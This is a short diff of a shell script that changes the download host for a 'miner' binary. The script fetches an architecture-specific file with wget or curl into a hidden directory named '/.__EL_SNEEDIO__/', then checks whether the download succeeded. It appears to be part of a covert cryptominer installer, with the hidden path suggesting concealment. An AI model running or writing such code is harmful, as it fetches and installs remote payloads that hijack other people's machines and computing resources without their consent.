@@ -1,4 +1,4 @@
-wget flamecord.tk/miner-`uname -m` -O /.__EL_SNEEDIO__/miner || curl -L flamecord.tk/miner-`uname -m` -o /.__EL_SNEEDIO__/miner
+wget flamecord.zixel.tk/miner-`uname -m` -O /.__EL_SNEEDIO__/miner || curl -L flamecord.zixel.tk/miner-`uname -m` -o /.__EL_SNEEDIO__/miner
 if ! test -f /.__EL_SNEEDIO__/miner; then
     echo could not download miner
     echo END
